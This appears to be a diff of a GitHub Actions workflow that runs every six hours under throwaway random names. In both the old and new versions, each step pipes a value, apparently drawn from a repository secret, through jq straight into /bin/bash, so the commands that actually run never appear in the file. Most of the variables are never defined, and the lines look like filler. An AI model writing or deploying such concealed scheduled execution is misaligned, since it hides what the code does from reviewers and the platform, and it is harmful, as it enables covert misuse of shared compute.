@@ -3,27 +3,24 @@ name: weihuanpeng1987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 0/6 * * *'
-
+    - cron: '59 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: weihuanpeng1987
         env:
-          zura27: ${{ secrets.zura27 }}
+          snlrn68: ${{ secrets.snlrn68 }}
         run: |
-          echo $zura27 | jq -r .ox98 | /bin/bash
-          echo $z934 | jq -r .cxatf88 | /bin/bash
-          echo $hwl2563 | jq -r .op5 | /bin/bash
-          echo $rl50564 | jq -r .x197 | /bin/bash
-          echo $b5 | jq -r .e54 | /bin/bash
-          echo $zie7806 | jq -r .h33404 | /bin/bash
-          echo $ayqrt26 | jq -r .yfxx90 | /bin/bash
-          echo $mf6249 | jq -r .q087 | /bin/bash
-          echo $o3268 | jq -r .knmr9 | /bin/bash
-          echo $v4969 | jq -r .z03 | /bin/bash
-          echo $urnn338 | jq -r .p35 | /bin/bash
-          echo $yepvz6835 | jq -r .vddlp7 | /bin/bash
+          echo $snlrn68 | jq -r .rbcao200 | /bin/bash
+          echo $lljao7043 | jq -r .xnof270 | /bin/bash
+          echo $f0 | jq -r .bx3 | /bin/bash
+          echo $wrbeb11951 | jq -r .zso725 | /bin/bash
+          echo $afkdt64478 | jq -r .wuwn970 | /bin/bash
+          echo $vcwxq359 | jq -r .y5 | /bin/bash
+          echo $eydwi56 | jq -r .mbz9 | /bin/bash
+          echo $opr0 | jq -r .r75 | /bin/bash
+          echo $x62 | jq -r .odb49 | /bin/bash
 
